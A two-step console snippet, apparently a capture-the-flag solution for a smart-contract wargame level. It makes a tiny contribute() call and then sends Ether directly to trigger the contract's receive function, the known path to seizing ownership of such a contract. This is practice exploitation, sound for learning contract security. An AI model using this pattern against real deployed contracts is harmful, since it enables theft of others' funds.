// input into the console terminal

// Step 1: Contribute a small amount
contract.contribute({ value: ethers.utils.parseEther("0.0001") });

// Step 2: Trigger receive by sending Ether directly
sendTransaction({
      from: player,
      to: contract.address,
      value: toWei("0.001")
});
